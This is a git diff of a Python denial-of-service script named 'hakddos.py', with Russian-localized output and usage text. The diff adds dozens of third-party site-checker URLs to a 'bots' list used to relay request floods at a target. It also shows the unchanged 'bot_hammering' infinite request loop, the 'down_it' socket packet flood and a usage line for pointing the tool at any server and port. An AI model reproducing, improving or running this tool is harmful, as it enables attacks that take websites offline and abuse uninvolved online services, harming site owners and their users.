@@ -29,7 +29,60 @@ def my_bots():
 	global bots
 	bots=[]
 	bots.append("http://validator.w3.org/check?uri=")
-	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
+	bots.append("http://ip-calculator.ru/siteip/?domain=")
+	bots.append("http://sitechecker.pro/app/main/project/598886/progress?guest_project_id=598886&guest_project_title=")
+	bots.append("http://2ip.ua/ru/services/ip-service/ping-traceroute?ip=")
+	bots.append("http://2ip.ua/ru/services/ip-service/ping-traceroute?ip=")
+	bots.append("http://2ip.ua/ru/services/ip-service/ping-traceroute?ip=")
+	bots.append("http://2ip.ua/ru/services/ip-service/ping-traceroute?ip=")
+	bots.append("http://check-host.net/ip-info?host=")
+	bots.append("http://check-host.net/check-ping?host=")
+	bots.append("http://check-host.net/check-ping?host=")
+	bots.append("http://check-host.net/check-ping?host=")
+	bots.append("http://check-host.net/check-ping?host=")
+	bots.append("http://check-host.net/check-ping?host=")
+	bots.append("http://check-host.net/check-http?host=")
+	bots.append("http://check-host.net/check-http?host=")
+	bots.append("http://check-host.net/check-http?host=")
+	bots.append("http://check-host.net/check-http?host=")
+	bots.append("http://check-host.net/check-http?host=")
+	bots.append("http://check-host.net/check-http?host=")
+	bots.append("http://check-host.net/check-tcp?host=")
+	bots.append("http://check-host.net/check-tcp?host=")
+	bots.append("http://check-host.net/check-tcp?host=")
+	bots.append("http://check-host.net/check-tcp?host=")
+	bots.append("http://check-host.net/check-udp?host=")
+	bots.append("http://check-host.net/check-udp?host=")
+	bots.append("http://check-host.net/check-udp?host=")
+	bots.append("http://check-host.net/check-udp?host=")
+	bots.append("http://check-host.net/check-dns?host=")
+	bots.append("http://check-host.net/check-dns?host=")
+	bots.append("http://check-host.net/check-dns?host=")
+	bots.append("http://check-host.net/check-dns?host=")
+	bots.append("http://www.reg.ru/choose/domain/?domains=")
+	bots.append("http://www.reg.ru/choose/domain/?domains=")
+	bots.append("http://www.reg.ru/choose/domain/?domains=")
+	bots.append("http://www.reg.ru/choose/domain/?domains=")
+	bots.append("http://2ip.ua/ru/services/ip-service/ping-traceroute?ip=")
+	bots.append("http://2ip.ua/ru/services/ip-service/ping-traceroute?ip=")
+	bots.append("http://2ip.ua/ru/services/ip-service/ping-traceroute?ip=")
+	bots.append("http://2ip.ua/ru/services/ip-service/ping-traceroute?ip=")
+	bots.append("http://check-host.net/check-ping?host=")
+	bots.append("http://check-host.net/check-ping?host=")
+	bots.append("http://check-host.net/check-ping?host=")
+	bots.append("http://check-host.net/check-ping?host=")
+	bots.append("http://check-host.net/check-http?host=")
+	bots.append("http://check-host.net/check-http?host=")
+	bots.append("http://check-host.net/check-http?host=")
+	bots.append("http://check-host.net/check-http?host=")
+	bots.append("http://check-host.net/check-http?host=")
+	bots.append("http://check-host.net/check-http?host=")
+	bots.append("http://check-host.net/check-tcp?host=")
+	bots.append("http://check-host.net/check-tcp?host=")
+	bots.append("http://check-host.net/check-tcp?host=")
+	bots.append("http://check-host.net/check-tcp?host=")
+	bots.append("http://2ip.ua/ru/services/ip-service/ping-traceroute?ip=")
+	bots.append("http://2ip.ua/ru/services/ip-service/ping-traceroute?ip=")
 	return(bots)
 
 
@@ -37,7 +90,7 @@ def bot_hammering(url):
 	try:
 		while True:
 			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
-			print("\033[94mbot is hammering...\033[0m")
+			print("\033[94m Не отправлено...\033[0m")
 			time.sleep(.1)
 	except:
 		time.sleep(.1)
@@ -51,13 +104,13 @@ def down_it(item):
 			s.connect((host,int(port)))
 			if s.sendto( packet, (host, int(port)) ):
 				s.shutdown(1)
-				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <-- Пакеты отправлены! white haker --> \033[0m")
+				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <-- Удачно! white haker --> \033[0m")
 			else:
 				s.shutdown(1)
 				print("\033[91mshut<->down\033[0m")
 			time.sleep(.1)
 	except socket.error as e:
-		print("\033[91mno соединение! сервер может быть выключен\033[0m")
+		print("\033[91m Нет соединение! сервер может быть выключен\033[0m")
 		#print("\033[91m",e,"\033[0m")
 		time.sleep(.1)
 
@@ -80,14 +133,14 @@ def usage():
 	print (''' \033[92m
 
 
-     █───█─█──█─███─███─███   █──█─████─█──█─███─████ 
+     █───█─█──█─███─███─███   █──█─████─█──█─███─████
      █───█─█──█──█───█──█     █──█─█──█─█─█──█───█──█
-     █─█─█─████──█───█──███   ████─████─██───███─████ 
-     █████─█──█──█───█──█     █──█─█──█─█─█──█───█─█  
-     ─█─█──█──█─███──█──███   █──█─█──█─█──█─███─█─█ 
+     █─█─█─████──█───█──███   ████─████─██───███─████
+     █████─█──█──█───█──█     █──█─█──█─█─█──█───█─█
+     ─█─█──█──█─███──█──███   █──█─█──█─█──█─███─█─█
 
-	Для использование:
-	
+	Что бы запустить: phyton3 hakddos.py -s Сайт -p Порт
+
 	-s : Сервер ip
 	-p : Порт Дефолт 80
 	-t : По умолчанию 135 \033[0m''')
